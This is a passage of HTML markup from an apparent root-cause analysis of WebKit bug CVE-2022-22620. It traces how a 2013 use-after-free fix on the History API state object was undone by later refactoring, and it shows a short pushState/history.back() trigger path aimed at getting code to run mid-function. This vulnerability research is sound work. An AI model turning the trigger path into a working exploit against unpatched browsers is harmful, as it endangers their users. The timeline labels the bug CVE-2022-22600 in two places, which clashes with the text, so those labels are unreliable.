class=\"ZslSztaQWN-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c12 ZslSztaQWN-c19\"&gt;&lt;span&gt;In order to fix this bug, it appears that the developers decided to change every caller of &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;SerializedScriptValue::deserialize&lt;/span&gt;&lt;span&gt;&amp;nbsp;to increase the reference count &lt;/span&gt;&lt;span&gt;on the&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;stateObject&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;by changing the argument types from a raw pointer to &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;PassRefPtr&amp;lt;SerializedScriptValue&amp;gt;&lt;/span&gt;&lt;span&gt;. &amp;nbsp;While the originally reported trigger called &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;deserialize&lt;/span&gt;&lt;span&gt;&amp;nbsp;on the &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;stateObject&lt;/span&gt;&lt;span&gt;&amp;nbsp;through the &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;V8History::stateAccessorGetter&lt;/span&gt;&lt;span&gt;&amp;nbsp;function, the developers&amp;rsquo; fix also caught and patched the path to &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;deserialize&lt;/span&gt;&lt;span&gt;&amp;nbsp;through &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;loadInSameDocument&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c11\"&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c12 ZslSztaQWN-c19\"&gt;&lt;span&gt;The timeline of the changes impacting the &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;stateObject&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;&amp;nbsp;is:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c11\"&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n&lt;ul class=\"c22 lst-kix_vnkr79j0brd5-0 start\"&gt;&lt;li class=\"c12 c19 c23 li-bullet-0\"&gt;&lt;span class=\"ZslSztaQWN-c16\"&gt;&lt;a class=\"ZslSztaQWN-c141\" href=\"https://github.com/WebKit/WebKit/commit/e544495d282d4726fcb491e0e441ddba338b5ec1\"&gt;December 2009 - state object History API added.&lt;/a&gt;&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;ul class=\"c22 lst-kix_vnkr79j0brd5-1 start\" style=\"margin-left: 23pt;\"&gt;&lt;li class=\"c12 c19 c26 li-bullet-0\"&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;HistoryItem.m_stateObject&lt;/span&gt;&lt;span&gt;&amp;nbsp;is type &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;RefPtr&amp;lt;SerializedScriptValue&amp;gt;&lt;/span&gt;&lt;/li&gt;&lt;li class=\"c12 c19 c26 li-bullet-0\"&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;HistoryItem::stateObject()&lt;/span&gt;&lt;span&gt;&amp;nbsp;returns &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;SerializedScriptValue*&lt;/span&gt;&lt;/li&gt;&lt;li class=\"c12 c19 c26 li-bullet-0\"&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;FrameLoader::loadInSameDocument&lt;/span&gt;&lt;span&gt;&amp;nbsp;takes &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;stateObject&lt;/span&gt;&lt;span&gt;&amp;nbsp;argument as &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;SerializedScriptValue*&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n&lt;ul class=\"c22 lst-kix_vnkr79j0brd5-0\"&gt;&lt;li class=\"c12 c19 c23 li-bullet-0\"&gt;&lt;span class=\"ZslSztaQWN-c16\"&gt;&lt;a class=\"ZslSztaQWN-c141\" href=\"https://github.com/WebKit/WebKit/commit/4b3be1d3a8d22cb2b2f5ddb8299f7cd25a21cebf\"&gt;January 2013 - Patching Sergei&amp;rsquo;s bug&lt;/a&gt;&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;ul class=\"c22 lst-kix_vnkr79j0brd5-1 start\" style=\"margin-left: 23pt;\"&gt;&lt;li class=\"c12 c19 c26 li-bullet-0\"&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;HistoryItem::stateObject&lt;/span&gt;&lt;span&gt;&amp;nbsp;returns a &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;PassRefPtr&amp;lt;SerializedScriptValue&amp;gt;&lt;/span&gt;&lt;/li&gt;&lt;li class=\"c12 c19 c26 li-bullet-0\"&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;FrameLoader::loadInSameDocument&lt;/span&gt;&lt;span&gt;&amp;nbsp;takes &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;stateObject&lt;/span&gt;&lt;span&gt;&amp;nbsp;argument as &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;PassRefPtr&amp;lt;SerializedScriptValue&amp;gt;&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n&lt;ul class=\"c22 lst-kix_vnkr79j0brd5-0\"&gt;&lt;li class=\"c12 c19 c23 li-bullet-0\"&gt;&lt;span class=\"ZslSztaQWN-c16\"&gt;&lt;a class=\"ZslSztaQWN-c141\" href=\"https://github.com/WebKit/WebKit/commit/ec83a53b569f6c2b493e9874a498cd1b683656a1\"&gt;September 2015- Deprecating use of PassRefPtr in history directory&lt;/a&gt;&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;ul class=\"c22 lst-kix_vnkr79j0brd5-1 start\" style=\"margin-left: 23pt;\"&gt;&lt;li class=\"c12 c19 c26 li-bullet-0\"&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;HistoryItem::stateObject&lt;/span&gt;&lt;span&gt;&amp;nbsp;returns &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;RefPtr&lt;/span&gt;&lt;span&gt;&amp;nbsp;instead of &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;PassRefPtr&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n&lt;ul class=\"c22 lst-kix_vnkr79j0brd5-0\"&gt;&lt;li class=\"c12 c19 c23 li-bullet-0\"&gt;&lt;span class=\"ZslSztaQWN-c16\"&gt;&lt;a class=\"ZslSztaQWN-c141\" href=\"https://github.com/WebKit/WebKit/commit/ed43edee9f8f114c3b2db3c0420e23f926a968ee\"&gt;October 2016 - (Potentially) ad-hoc refactoring &lt;/a&gt;&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;ul class=\"c22 lst-kix_vnkr79j0brd5-1 start\" style=\"margin-left: 23pt;\"&gt;&lt;li class=\"c12 c19 c26 li-bullet-0\"&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;HistoryItem::stateObject()&lt;/span&gt;&lt;span&gt;&amp;nbsp;is changed to return raw pointer instead of &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;RefPtr&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n&lt;ul class=\"c22 lst-kix_vnkr79j0brd5-0\"&gt;&lt;li class=\"c12 c19 c23 li-bullet-0\"&gt;&lt;span class=\"ZslSztaQWN-c16\"&gt;&lt;a class=\"ZslSztaQWN-c141\" href=\"https://github.com/WebKit/WebKit/commit/aa31b6b4d09b09acdf1cec11f2f7f35bd362dd0e\"&gt;December 2016 - CVE-2022-22600 introduced&lt;/a&gt;&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;ul class=\"c22 lst-kix_vnkr79j0brd5-1 start\" style=\"margin-left: 23pt;\"&gt;&lt;li class=\"c12 c19 c26 li-bullet-0\"&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;FrameLoader::loadInSameDocument&lt;/span&gt;&lt;span&gt;&amp;nbsp;changed to take &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;stateObject&lt;/span&gt;&lt;span&gt;&amp;nbsp;as a raw pointer instead of &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;PassRefPtr&amp;lt;SerializedScriptValue&amp;gt;&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n&lt;ul class=\"c22 lst-kix_vnkr79j0brd5-0\"&gt;&lt;li class=\"c12 c19 c23 li-bullet-0\"&gt;&lt;span class=\"ZslSztaQWN-c16\"&gt;&lt;a class=\"ZslSztaQWN-c141\" href=\"https://github.com/WebKit/WebKit/commit/486816dc355c19f1de1b8056f85d0bbf7084dd6e\"&gt;January 2022 - CVE-2022-22600 patched&lt;/a&gt;&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;ul class=\"c22 lst-kix_vnkr79j0brd5-1 start\" style=\"margin-left: 23pt;\"&gt;&lt;li class=\"c12 c19 c26 li-bullet-0\"&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;FrameLoader::loadInSameDocument&lt;/span&gt;&lt;span&gt;&amp;nbsp;changed to take &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;stateObject&lt;/span&gt;&lt;span&gt;&amp;nbsp;as a &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;RefPtr&amp;lt;SerializedScriptValue&amp;gt;&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n &lt;p class=\"ZslSztaQWN-c11\"&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h1 class=\"ZslSztaQWN-c19 ZslSztaQWN-c31\" id=\"h.av2i567ev8fi\"&gt;&lt;span&gt;The Autopsy&lt;/span&gt;&lt;/h1&gt;\n &lt;p class=\"ZslSztaQWN-c12 ZslSztaQWN-c19\"&gt;&lt;span&gt;When we look at the timeline of changes for &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;FrameLoader::loadInSameDocument&lt;/span&gt;&lt;span&gt;&amp;nbsp;it seems that the bug was re-introduced in December 2016 due to refactoring. The question is, why did the patch author think that &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;loadInSameDocument&lt;/span&gt;&lt;span&gt;&amp;nbsp;would not need to hold a reference. From the &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c16\"&gt;&lt;a class=\"ZslSztaQWN-c141\" href=\"https://github.com/WebKit/WebKit/commit/aa31b6b4d09b09acdf1cec11f2f7f35bd362dd0e\"&gt;December 2016 commit ChangeLog&lt;/a&gt;&lt;/span&gt;&lt;span&gt;: &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;Take a raw pointer for the serialized script value state object. &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;No one was passing ownership.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c11\"&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c12 ZslSztaQWN-c19\"&gt;&lt;span&gt;My assessment is that it&amp;rsquo;s due to the October 2016 changes in &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;HistoryItem:stateObject&lt;/span&gt;&lt;span&gt;. When the author was evaluating the refactoring changes needed in the &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;dom&lt;/span&gt;&lt;span&gt;&amp;nbsp;directory in December 2016, it would have appeared that the only calls to &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;loadInSameDocument&lt;/span&gt;&lt;span&gt;&amp;nbsp;passed in either a &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;null&lt;/span&gt;&lt;span&gt;&amp;nbsp;value or the result of &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;stateObject()&lt;/span&gt;&lt;span&gt;&amp;nbsp;which as of October 2016 now passed a raw &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;SerializedScriptValue*&lt;/span&gt;&lt;span&gt;&amp;nbsp;pointer. When looking at those two options for the type of an argument, then it&amp;rsquo;s potentially understandable that the developer thought that &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;loadInSameDocument&lt;/span&gt;&lt;span&gt;&amp;nbsp;did not need to share ownership of &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;stateObject&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c11\"&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c12 ZslSztaQWN-c19\"&gt;&lt;span&gt;So why then was &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;HistoryItem::stateObject&lt;/span&gt;&lt;span&gt;&amp;rsquo;s return value changed from a &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;RefPtr&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;&amp;nbsp;to a raw pointer in October 2016? That I&amp;rsquo;m struggling to find an explanation for. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c11\"&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c12 ZslSztaQWN-c19\"&gt;&lt;span&gt;According to the description, the patch in October 2016 was intended to &amp;ldquo;Replace all uses of ExceptionCodeWithMessage with WebCore::Exception&amp;rdquo;. However when we look at the ChangeLog it seems that the author decided to also do some (seemingly unrelated) refactoring to &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;HistoryItem&lt;/span&gt;&lt;span&gt;. These are some of the only changes in the commit whose descriptions aren&amp;rsquo;t related to exceptions. As an outsider looking at the commits, it seems that the developer by chance thought they&amp;rsquo;d do a little &amp;ldquo;clean-up&amp;rdquo; while working through the required refactoring on the exceptions. If this was simply an additional ad-hoc step while in the code, rather than the goal of the commit, it seems plausible that the developer and reviewers may not have further traced the full lifetime of &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;HistoryItem::stateObject&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c11\"&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c12 ZslSztaQWN-c19\"&gt;&lt;span&gt;While the change to &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;HistoryItem&lt;/span&gt;&lt;span&gt;&amp;nbsp;in October 2016 was not sufficient to introduce the bug, it seems that that change likely contributed to the developer in December 2016 thinking that &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;loadInSameDocument&lt;/span&gt;&lt;span&gt;&amp;nbsp;didn&amp;rsquo;t need to increase the reference count on the &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;stateObject&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c11\"&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c12 ZslSztaQWN-c19\"&gt;&lt;span&gt;Both the October 2016 and the December 2016 commits were very large. The commit in October changed 40 files with 900 additions and 1225 deletions. The commit in December changed 95 files with 1336 additions and 1325 deletions. It seems untenable for any developers or reviewers to understand the security implications of each change in those commits in detail&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;, especially since they&amp;rsquo;re related to lifetime semantics.&lt;/span&gt;&lt;/p&gt;&lt;h1 class=\"ZslSztaQWN-c31 ZslSztaQWN-c19\" id=\"h.wnkfqwd2smy6\"&gt;&lt;span&gt;The Zombie&lt;/span&gt;&lt;/h1&gt;\n &lt;p class=\"ZslSztaQWN-c12 ZslSztaQWN-c19\"&gt;&lt;span&gt;We&amp;rsquo;ve now tracked down the evolution of changes to fix the 2013 vulnerability&amp;hellip;and then revert those fixes&amp;hellip; so I got back to identifying the 2022 bug. It&amp;rsquo;s the same bug, but triggered through a different path. T&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;hat&amp;rsquo;s why the 2013 test case wasn&amp;rsquo;t crashing the version of WebKit that should have been vulnerable to CVE-2022-22620:&lt;/span&gt;&lt;/p&gt;&lt;ol class=\"c22 lst-kix_rpn0sahs9m0k-0 start\" start=\"1\"&gt;&lt;li class=\"c12 c19 c23 li-bullet-0\"&gt;&lt;span&gt;The 2013 test case triggers the bug through the &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;V8History::stateAccessorAndGetter&lt;/span&gt;&lt;span&gt;&amp;nbsp;path instead of &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;FrameLoader::loadInSameDocument&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;, and&lt;/span&gt;&lt;/li&gt;&lt;li class=\"c12 c19 c23 li-bullet-0\"&gt;&lt;span&gt;As a part of Sergei&amp;rsquo;s 2013 bug report there were additional hardening measures put into place that prevented user-code callbacks being processed during deserialization.&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;\n &lt;p class=\"ZslSztaQWN-c12 ZslSztaQWN-c19\"&gt;&lt;span&gt;Therefore we needed to figure out how to call &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;loadInSameDocument&lt;/span&gt;&lt;span&gt;&amp;nbsp;and instead of using the deserialization to trigger a JavaScript callback, we needed to find another event in the &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;loadInSameDocument&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;&amp;nbsp;function that would trigger the callback to user JavaScript.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c11\"&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c12 ZslSztaQWN-c19\"&gt;&lt;span&gt;To quickly figure out how to call &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;loadInSameDocument&lt;/span&gt;&lt;span&gt;, I modified the WebKit source code to trigger a test failure if &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;loadInSameDocument&lt;/span&gt;&lt;span&gt;&amp;nbsp;was ever called and then ran all the tests in the &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;fast/history&lt;/span&gt;&lt;span&gt;&amp;nbsp;d&lt;/span&gt;&lt;span&gt;irectory. There were 5 out of the 80 tests that called &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;loadInSameDocument&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;:&lt;/span&gt;&lt;/p&gt;&lt;ul class=\"c22 lst-kix_3vloefecb731-0 start\"&gt;&lt;li class=\"c12 c19 c23 li-bullet-0\"&gt;&lt;span class=\"ZslSztaQWN-c16\"&gt;&lt;a class=\"ZslSztaQWN-c141\" href=\"https://github.com/WebKit/WebKit/blob/main/LayoutTests/fast/history/multiple-back-forward-navigations.html\"&gt;fast/history/multiple-back-forward-navigations.html&lt;/a&gt;&lt;/span&gt;&lt;/li&gt;&lt;li class=\"c12 c19 c23 li-bullet-0\"&gt;&lt;span class=\"ZslSztaQWN-c16\"&gt;&lt;a class=\"ZslSztaQWN-c141\" href=\"https://github.com/WebKit/WebKit/blob/main/LayoutTests/fast/history/history-traversal-is-asynchronous.html\"&gt;fast/history/history-traversal-is-asynchronous.html&lt;/a&gt;&lt;/span&gt;&lt;/li&gt;&lt;li class=\"c12 c19 c23 li-bullet-0\"&gt;&lt;span class=\"ZslSztaQWN-c16\"&gt;&lt;a class=\"ZslSztaQWN-c141\" href=\"https://github.com/WebKit/WebKit/blob/main/LayoutTests/fast/history/history-back-forward-within-subframe-hash.html\"&gt;fast/history/history-back-forward-within-subframe-hash.html&lt;/a&gt;&lt;/span&gt;&lt;/li&gt;&lt;li class=\"c12 c19 c23 li-bullet-0\"&gt;&lt;span class=\"ZslSztaQWN-c16\"&gt;&lt;a class=\"ZslSztaQWN-c141\" href=\"https://github.com/WebKit/WebKit/blob/main/LayoutTests/fast/history/link-inside-any.html\"&gt;fast/history/link-inside-any.html&lt;/a&gt;&lt;/span&gt;&lt;/li&gt;&lt;li class=\"c12 c19 c23 li-bullet-0\"&gt;&lt;span class=\"ZslSztaQWN-c16\"&gt;&lt;a class=\"ZslSztaQWN-c141\" href=\"https://github.com/WebKit/WebKit/blob/main/LayoutTests/fast/history/timed-refresh-in-cached-frame.html\"&gt;fast/history/timed-refresh-in-cached-frame.html&lt;/a&gt;&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n &lt;p class=\"ZslSztaQWN-c11\"&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c12 ZslSztaQWN-c19\"&gt;&lt;span&gt;The tests &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;history-back-forward-within-subframe-hash.html&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;fast/history/history-traversal-is-asynchronous.html&lt;/span&gt;&lt;span&gt;&amp;nbsp;were the most helpful. We can trigger the call to &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;loadInSameDocument&lt;/span&gt;&lt;span&gt;&amp;nbsp;by setting the history stack with an object whose location is the same page, but includes a hash. We then call &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;history.back()&lt;/span&gt;&lt;span&gt;&amp;nbsp;to go back to that state that includes the URL with the hash. &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;loadInSamePage&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;&amp;nbsp;is responsible for scrolling to that location.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c11\"&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.6c73d82779de9619168336c5e74c9282d03e1118\"&gt;&lt;/a&gt;&lt;a id=\"t.2\"&gt;&lt;/a&gt;&lt;table class=\"ZslSztaQWN-c27\"&gt;&lt;tr class=\"ZslSztaQWN-c15\"&gt;&lt;td class=\"ZslSztaQWN-c10\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ZslSztaQWN-c12\"&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;history&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;.&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;pushState&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;(&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c17\"&gt;&amp;quot;state1&amp;quot;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;,&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c17\"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;,&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;&amp;nbsp;location &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;+&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c17\"&gt;&amp;quot;#foo&amp;quot;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c12\"&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;history&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;.&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;pushState&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;(&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c17\"&gt;&amp;quot;state2&amp;quot;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;,&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c17\"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;);&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c32\"&gt;// current state&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c12 ZslSztaQWN-c20\"&gt;&lt;span class=\"ZslSztaQWN-c0 ZslSztaQWN-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c12\"&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;history&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;.&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;back&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;();&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c32\"&gt;//goes back to state1, triggering loadInSameDocument&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"ZslSztaQWN-c11\"&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c11\"&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c12 ZslSztaQWN-c19\"&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c12 ZslSztaQWN-c19\"&gt;&lt;span&gt;Now that I knew how to call &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;loadInSameDocument&lt;/span&gt;&lt;span&gt;, I teamed up with Sergei to identify how we could get user code execution sometime during the &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;loadInSameDocument&lt;/span&gt;&lt;span&gt;&amp;nbsp;function, but prior to the call to &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;statePopped&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;(&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c16\"&gt;&lt;a class=\"ZslSztaQWN-c141\" href=\"https://github.com/WebKit/WebKit/blob/7b23cae2a1b1ffd026288f15261f8ba272c3b24b/Source/WebCore/loader/FrameLoader.cpp#L1158\"&gt;FrameLoader.cpp#1158&lt;/a&gt;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;):&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c11\"&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.44cc163a06cabebe835e9730a761749f62c29f76\"&gt;&lt;/a&gt;&lt;a id=\"t.3\"&gt;&lt;/a&gt;&lt;table class=\"ZslSztaQWN-c27\"&gt;&lt;tr class=\"ZslSztaQWN-c15\"&gt;&lt;td class=\"ZslSztaQWN-c10\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ZslSztaQWN-c12\"&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;m_frame&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;.&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;document&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;()-&amp;gt;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;statePopped&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;(&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;stateObject &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;?&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c1\"&gt;Ref&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;&amp;lt;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c1\"&gt;SerializedScriptValue&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;&amp;gt;&lt;/span&gt;&lt;span 